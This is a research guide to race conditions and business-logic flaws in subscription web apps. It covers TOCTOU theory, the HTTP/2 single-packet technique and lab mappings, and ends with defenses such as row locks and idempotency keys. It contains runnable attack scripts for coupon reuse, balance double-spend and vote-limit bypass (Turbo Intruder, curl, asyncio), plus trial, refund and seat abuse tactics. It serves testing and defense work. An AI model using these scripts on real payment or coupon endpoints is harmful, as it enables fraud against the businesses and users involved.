# Race Conditions and Advanced Business Logic: Deep-Dive Research

**Scope:** authorized testing only — the user's own Flask subscription app, local labs, PortSwigger Academy, PayloadsAllTheThings, or explicitly permitted bug-bounty targets.
**Core model:** a race condition wins when parallel requests observe the same pre-change state and commit conflicting transitions; a business-logic flaw wins when each request is valid but the sequence, state, price, quantity, or entitlement transition violates the intended rule.

---

## 1. Race-condition theory

### 1.1 Check-then-act / TOCTOU
A web race condition occurs when correctness depends on request timing. The dangerous shape is **read-check-decide-write**:
1. Request A reads `coupon.used = false`.
2. Request B reads `coupon.used = false`.
3. Both decide the coupon is valid.
4. Both apply the discount.
5. Both write `coupon.used = true`.
If read and write are not atomic, the "only once" invariant fails. PortSwigger calls limit overruns a subtype of **time-of-check to time-of-use (TOCTOU)** flaws.

### 1.2 Time-of-check vs time-of-use
- **Time of check:** validation moment — `balance >= price`, `coupon unused`, `seats_available > 0`, `trial not claimed`, `attempt_count < max`.
- **Time of use:** commit moment — `INSERT redemption`, `UPDATE balance`, `UPDATE subscription.status`, `DELETE token`, `INSERT vote`.
The race window is the interval between them. It may be microseconds or longer if the handler performs multiple DB queries, external API calls, email/SMS delivery, rendering, or sleeps.

### 1.3 Why parallel requests break assumptions
Sequential tests hide the bug because request 1 commits before request 2 checks. Parallel requests expose assumptions that:
- one request mutates a resource at a time;
- Flask/WSGI workers, async tasks, or multiple processes share state safely;
- cookies/sessions isolate accounts, though two tabs/devices/API calls share one account;
- route-level locks cover the whole business transaction;
- webhooks, background jobs, and polling cannot mutate the same row concurrently.

### 1.4 Sub-states and state machines
PortSwigger's "smashing the state machine" research describes temporary **sub-states**: order created but unpaid, coupon checked but not marked used, token generated but not invalidated, subscription upgraded but webhook not reconciled. Another request can act while that sub-state exists.

---

## 2. Single-packet attacks and Turbo Intruder

### 2.1 Network jitter and last-byte sync
Firing requests "at once" does not make them arrive together. Network jitter, TLS setup, packet scheduling, and server queues spread arrival times by milliseconds — often enough for request 1 to finish before request 2 starts.

**Last-byte sync** sends every request except its final byte, then releases all final bytes together. It reduces client-side spread but still uses separate connections/streams.

### 2.2 HTTP/2 single-packet attack
PortSwigger Research's technique for HTTP/2:
1. Open one HTTP/2 connection.
2. Queue 20–30 requests.
3. Withhold a tiny final fragment from each.
4. Wait briefly for packets to approach the target.
5. Send all final fragments; the OS groups them into one TCP packet.
Requests complete nearly simultaneously regardless of prior jitter. Published benchmark: about **1 ms median spread / 0.3 ms SD** versus **4 ms / 3 ms** for last-byte sync.

Constraints: best on HTTP/2; HTTP/1.1 needs multiple connections/threaded timing; very large bodies may need first-sequence-sync workarounds. A negative timestamp in Turbo Intruder can indicate the server responded before the request finished sending — evidence of overlap.

### 2.3 Burp Repeater vs Turbo Intruder
Burp Suite Professional 2023.9+ groups tabs and sends them in parallel: HTTP/1 uses last-byte sync; HTTP/2 uses single-packet attack. "Trigger race conditions" automates common labs. Burp Community lacks this native workflow, so use Turbo Intruder, `curl` parallel jobs, Python `asyncio`/`aiohttp`, or HTTP/2 tools.

### 2.4 Turbo Intruder: coupon reuse
Use on `POST /api/coupon/redeem` or equivalent.

```python
def queueRequests(target, wordlists):
    # HTTP/2 target: Engine.BURP2 + one connection = single-packet attack.
    # HTTP/1.1 target: use Engine.THREADED or Engine.BURP with many connections.
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # target.req must contain the coupon body, e.g. {"code":"SAVE50"}.
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status in (200, 201, 202) or 'success' in req.response.lower():
        table.add(req)
```

Signal: many successes instead of one success plus "already used". Verify server-side balance/discount/coupon ledger.

### 2.5 Turbo Intruder: balance double-spend
Use on `POST /api/withdraw`, `/transfer`, `/balance/spend`, or any check-balance-then-debit endpoint.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Example body: {"amount":10.00,"destination":"acct_b"}
    # If the app uses an idempotency-looking field, test both fixed and unique values.
    for i in range(25):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200 or 'success' in req.response.lower():
        table.add(req)
```

Verify final balance and ledger: total debits must not exceed starting balance.

### 2.6 Turbo Intruder: vote/like limit bypass
Use on `POST /api/posts/123/vote`, `/like`, `/follow`, `/join`, `/claim`.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Capture one legitimate vote/claim request. If CSRF tokens are per-request,
    # adapt this template to obtain fresh tokens or target a token-free API.
    for i in range(20):
        engine.queue(target.req, gate='vote_race')
    engine.openGate('vote_race')

def handleResponse(req, interesting):
    if req.status == 200 and ('voted' in req.response.lower()
                              or 'liked' in req.response.lower()
                              or 'success' in req.response.lower()):
        table.add(req)
```

For multi-endpoint races, queue different requests under separate gates and synchronize them, e.g. `POST /cart` with `POST /cart/checkout`, or login with admin access.

---

## 3. Race-condition targets in subscription apps

| Target | Typical check | Race consequence |
|---|---|---|
| Coupon/promo redeem | `coupon.used == false` | Discount applied many times or negative total |
| Gift card/credit redeem | card/balance unused | Balance credited N times |
| Free trial claim | `trial_claimed == false` | Multiple trial periods/plan grants |
| Referral bonus | `referral.applied == false` | Repeated or self-referral payout |
| Upgrade/downgrade | current plan/status read | Higher entitlement with lower billing |
| Refund + access | refund vs subscription status | Refund succeeds while premium remains |
| Cancel/reactivate | subscription transition | New trial, retained access, duplicate sub |
| Family/team seats | `seat_count < max` | Oversell seats or negative seat price |
| Password-reset token | token valid/unused | Token reuse or multiple resets |
| Invite/email verify | token unused | One invite consumed by many accounts |
| Loyalty points | `points >= cost` | Points spent/duplicated multiple times |
| CAPTCHA/rate limit | attempts below threshold | Brute-force/OTP bypass |
| Inventory/seat reserve | `available > 0` | Overselling limited plans |
| Webhook replay | event not processed | Duplicate grants/revocations |

Flask warning pattern:

```python
if coupon.used:
    return error
coupon.used = True
order.discount = coupon.value
```

Another request can pass `if coupon.used` before the first commits. Fix with atomic conditional update, transaction lock, or unique constraint.

---

## 4. Detection methodology

### 4.1 Predict collisions
Look for endpoints that change money, credits, seats, plan, role, trial state, or access; enforce "once/first/only/max/per-user" rules; read state, call another service, then write; share session/account state across routes; or have async webhook/background processing.
Ask: **what two requests could both pass the same check?**

### 4.2 Probe for clues
Signals: response time differs between first/duplicate requests; multiple DB queries or external calls; frontend disables button but backend accepts replay; "already used" appears only after delay; websocket/polling lags POST; webhook processing is async; admin/support and user actions touch the same subscription; session locks do not cover payment endpoints.

### 4.3 Prove the concept
1. Send two identical requests manually in Repeater.
2. Compare sequential vs parallel responses.
3. Repeat 5–10 times; races are probabilistic.
4. Increase batch size only after anomalies appear.
5. Compare **state delta vs response count**: 10 successes but 1 credit means reconciled; 10 successes and 10 credits means bug.

### 4.4 Burp Pro workflow
Capture request → Repeater → duplicate tab 10–30× → add tabs to group → **Send group in parallel** → Burp chooses last-byte sync (HTTP/1) or single-packet attack (HTTP/2) → inspect response order/status/body → verify state.

### 4.5 Community/CLI workaround
```bash
for i in $(seq 1 30); do
  curl -sS -b cookies.txt -H 'Content-Type: application/json' \
    -d '{"code":"SAVE50"}' -o "resp_$i.txt" \
    -w "%{http_code} %{time_total}\n" \
    http://127.0.0.1:5000/api/coupon/redeem &
done
wait
```
Python `asyncio`/`aiohttp` gives better collection/diffing.

---

## 5. Asyncio attack script template

Baseline concurrency probe for the Flask app. It is not guaranteed single-packet timing; use Turbo Intruder/HTTP/2 tooling for the strongest sync.

```python
#!/usr/bin/env python3
"""Fire N concurrent requests and diff responses.
Usage: python3 race_probe.py http://127.0.0.1:5000 /api/coupon/redeem '{"code":"SAVE50"}' 'session=COOKIE' 30
"""
import asyncio, aiohttp, collections, json, sys, time

async def one(session, idx, url, payload, headers):
    t = time.perf_counter()
    try:
        async with session.post(url, json=payload, headers=headers) as r:
            body = await r.text()
            return {"idx": idx, "status": r.status,
                    "ms": (time.perf_counter()-t)*1000,
                    "body": body[:1000], "ok": r.status in (200,201,202)}
    except Exception as e:
        return {"idx": idx, "status": -1,
                "ms": (time.perf_counter()-t)*1000,
                "body": repr(e), "ok": False}

async def main():
    if len(sys.argv) < 5:
        print(__doc__); return 2
    base, path, payload_s, cookie = sys.argv[1:5]
    count = int(sys.argv[5]) if len(sys.argv) > 5 else 30
    url = base.rstrip("/") + path
    payload = json.loads(payload_s)
    headers = {"Content-Type":"application/json", "Cookie":cookie,
               "User-Agent":"race-probe/1.0", "Accept":"application/json"}
    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as s:
        results = await asyncio.gather(*[
            one(s, i, url, payload, headers) for i in range(count)
        ])
    ok = [r for r in results if r["ok"]]
    print(f"target={url} requests={len(results)} ok={len(ok)}")
    print("status_counts:", dict(collections.Counter(r["status"] for r in results)))
    print("body_groups:")
    for body, n in collections.Counter(r["body"][:160] for r in results).most_common(10):
        print(f"  {n:3d} x {body!r}")
    print("\ninteresting responses:")
    for r in results:
        low = r["body"].lower()
        if r["ok"] or any(x in low for x in ("success","redeemed","applied","credited","already")):
            print(f"#{r['idx']:02d} status={r['status']} time={r['ms']:.1f}ms body={r['body'][:300]!r}")
    if len(ok) > 1:
        print("\nPOSSIBLE RACE: multiple requests returned success. Verify server-side state.")
    return 0

if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
```

Adapt for CSRF tokens, cookies, or JSON/form bodies. Verify DB state, not just HTTP responses.

---

## 6. Business-logic deep patterns

Business-logic flaws use valid requests in invalid order/quantity/state/context.

### 6.1 Workflow step skipping
Map every step, replay each independently, reorder/remove steps, and call final/confirmation endpoints directly. Examples: `GET /cart/order-confirmation?order-confirmed=true` without paying, `POST /subscription/activate` without payment, premium route before email verification. Server-side state, not URL flags, must authorize completion.

### 6.2 Price oracle attacks
A price oracle reveals or bounds the real price through responses. Look for hidden `price_id`s, coupon validators returning final price, preview-vs-charge mismatches, and status/error differences. Tamper `plan_id`, `price_id`, `amount`, `currency`, `quantity`, `coupon`, `billing_interval`; compare UI total, order record, payment amount, and entitlement. Binary-search thresholds when errors distinguish "too expensive" from "invalid".

### 6.3 Currency and rounding abuse
Test pay-one-currency/refund-another, negative/zero amounts, fractional minor units, rounding direction differences, double conversion, tax/discount before vs after rounding, `float` prices vs integer cents, and dollar/cents mismatches.

### 6.4 Negative, zero, huge, overflow quantities
Try `quantity=-1`, `0`, `1.5`, `1.9`, `NaN`, `1e309`, values near `2^31-1`/`2^63-1`, mixed positive/negative line items, body-vs-URL quantity conflicts, and decimal seat counts. PortSwigger's low-level lab uses 32-bit overflow; HackerOne 364843 used negative quantity.

### 6.5 Referral, loyalty, and bonus abuse
Test self-referral, multiple referral codes, reward before referee conversion, points spent twice via race, client-controlled conversion rate/cost, signup credits on duplicate accounts, per-account promos across aliases, and bonuses before required verification.

---

## 7. Subscription-specific logic attacks

- **Downgrade keeping premium:** `PATCH plan=free`, cancel with future `premium_until`, stale cached plan/JWT/cookie entitlement, webhook race.
- **Cancel-then-refund-keep:** refund and cancel concurrently/reversed; check whether refund revokes access and cancellation preserves it.
- **Trial extension loops:** cancel/reactivate, delete/re-register, email aliases, manipulate `trial_days`/`trial_end`, multiple subscriptions/seats, race trial start vs deletion.
- **Family/team seats:** exceed purchased seats, decimal seats (`1.9` rounds up but bills integer part), invite race, transfer/remove/re-add, shared seat across devices, downgrade while members retain access.
- **Proration exploits:** upgrade→downgrade→refund, interval changes, seat changes near period end, coupons/refunds during proration, negative invoice/credit amounts, client-supplied timestamps.
- **Grace-period abuse:** use premium after failed payment, cancel/reactivate during dunning, reset grace repeatedly, race `invoice.payment_failed` webhook vs entitlement check, multiple subscriptions masking failure.

---

## 8. Defense side

### 8.1 Atomic check-and-set
Bad: `if not coupon.used: apply(); coupon.used=True`.
Better: transaction + row lock or single conditional update.

```python
with db.session.begin():
    coupon = db.session.query(Coupon).filter_by(code=code).with_for_update().one()
    if coupon.used_count >= coupon.max_uses:
        raise InvalidCoupon()
    apply_discount(order)
    coupon.used_count += 1
    db.session.add(CouponRedemption(user_id=user.id, coupon_id=coupon.id))
```

```sql
UPDATE coupons SET used_count = used_count + 1
WHERE code = :code AND used_count < max_uses RETURNING id;
```

Per-user once-only redemption:

```sql
INSERT INTO coupon_redemptions (user_id, coupon_id)
VALUES (:user_id, :coupon_id)
ON CONFLICT (user_id, coupon_id) DO NOTHING RETURNING id;
```

### 8.2 Transactions, locks, constraints
- Keep financial mutations in DB transactions.
- Use `SELECT ... FOR UPDATE`, Postgres advisory locks, or serializable isolation for high-risk operations.
- Keep transactions short; avoid slow external calls inside them.
- Add constraints: `UNIQUE(user_id,coupon_id)`, `UNIQUE(order_id,payment_event_id)`, `CHECK(quantity>0)`, `CHECK(amount>=0)`, `CHECK(balance>=0)`, `CHECK(seat_count<=purchased_seats)`.

### 8.3 Idempotency keys
For payment/refund/redeem/transfer/seat/webhook endpoints, require `Idempotency-Key`; store `(user_id, endpoint, key)` uniquely plus request fingerprint/response; replay returns same result; reject same key with different payload.

### 8.4 Rate limits and state machines
Rate-limit by authenticated user/account/coupon/endpoint/action, not just IP; use atomic counters. Define explicit subscription states (`trialing→active→past_due→canceled→expired`, `created→paid→active`) and reject invalid transitions server-side.

### 8.5 Webhooks, audit, anomalies
Verify webhook signatures, deduplicate event IDs, process idempotently, reconcile provider state, never grant entitlement from browser redirect alone. Log actor/object IDs, before/after balance/plan/coupon/seat/trial, request ID, idempotency key, webhook event. Alert on repeated redemptions, negative balance, entitlement without payment, rapid plan changes, refund/cancel loops, coupon overuse.

---

## 9. Real writeups and cases

- **Stripe unlimited discount redemption:** Turbo Intruder called accept-discount 30× in parallel; $20k discount became ~$600k fee-free value. First fix still raced; final fix made redemption atomic. https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption
- **Reverb gift-card multi-redeem:** ~30 concurrent redemptions produced multiple credits from one card. https://hackerone.com/reports/759247
- **Keybase invitation races:** 115007 bypassed invite limit; 148609 registered multiple users with one invite. https://hackerone.com/reports/115007 · https://hackerone.com/reports/148609 · https://www.josipfranjkovic.com/blog/race-conditions-on-web
- **GitLab CVE-2022-4037:** race led to verified-email forgery/account takeover via OAuth; demonstrated with single-packet methodology. https://portswigger.net/research/smashing-the-state-machine · https://nvd.nist.gov/vuln/detail/cve-2022-4037
- **Upserve negative quantity:** order JSON accepted negative quantity and reduced total. https://hackerone.com/reports/364843
- **Krisp decimal seats:** `1.9` seats added two seats but billed integer portion. https://hackerone.com/reports/1446090
- **lemlist failed payment:** user kept paid features after failed payments/cancel. https://hackerone.com/reports/1420697
- **Rounding/salami:** HackerOne 176461 credited receiver without debiting sender below precision; PAT summary: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md
- **HackerOne fee rounding:** report 808975 used micro-values to expose rounding/fee evasion. https://hackerone.com/reports/808975

---

## 10. Lab mapping

### PortSwigger Race Conditions
Topic: https://portswigger.net/web-security/race-conditions
1. Limit overrun race conditions — coupon/gift-card TOCTOU.
2. Bypassing rate limits via race conditions — failed-login counter race.
3. Multi-endpoint race conditions — align different requests.
4. Single-endpoint race conditions — deeper state-machine collision.
5. Exploiting time-sensitive vulnerabilities — reset-token timing.
6. Partial construction race conditions — access partially initialized objects.

Labs:
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction

### PortSwigger Business Logic
Topic: https://portswigger.net/web-security/logic-flaws
Most relevant: Excessive trust in client-side controls; High-level logic vulnerability; Low-level logic flaw; Inconsistent security controls; Flawed enforcement of business rules; Inconsistent handling of exceptional input; Infinite money logic flaw; Insufficient workflow validation; Weak isolation on dual-use endpoint; Authentication bypass via flawed state machine; Authentication bypass via encryption oracle.

### PayloadsAllTheThings
- Race Condition: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md — limit overrun, rate-limit bypass, last-byte sync, single-packet attack, Turbo Intruder/Raceocat/h2spacex.
- Business Logic Errors: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md — coupons, delivery fees, currency arbitrage, premium/refund abuse, negative quantities, rounding.

### Flask app practice path
1. Map signup/trial/checkout/webhook/cancel/refund/plan-change/seats/coupons/balance.
2. Write each invariant: "only one redemption", "balance cannot go negative", "plan must match payment", "seats cannot exceed purchased".
3. Test sequentially, then parallel.
4. Try workflow skips before price tampering; price/quantity/currency tampering before races.
5. Combine classes: plan change vs webhook reconciliation, refund vs entitlement revocation.
6. Verify DB/logs, not just responses.

---

## Sources
- PortSwigger Race Conditions: https://portswigger.net/web-security/race-conditions
- PortSwigger Research, Smashing the state machine: https://portswigger.net/research/smashing-the-state-machine
- PortSwigger Research, Single-packet attack: https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local
- PortSwigger Business Logic: https://portswigger.net/web-security/logic-flaws
- Turbo Intruder race docs: https://github.com/PortSwigger/turbo-intruder/blob/master/docs/race-conditions.md
- Turbo Intruder example: https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py
- PayloadsAllTheThings Race Condition: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md
- PayloadsAllTheThings Business Logic Errors: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md
- OWASP Business Logic Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html
- HackerOne/Stripe discount redemption: https://www.hackerone.com/blog/how-business-logic-vulnerability-led-unlimited-discount-redemption
- HackerOne reports: 759247, 115007, 148609, 364843, 1446090, 1420697, 808975 (links above)
- CVE-2022-4037: https://nvd.nist.gov/vuln/detail/cve-2022-4037
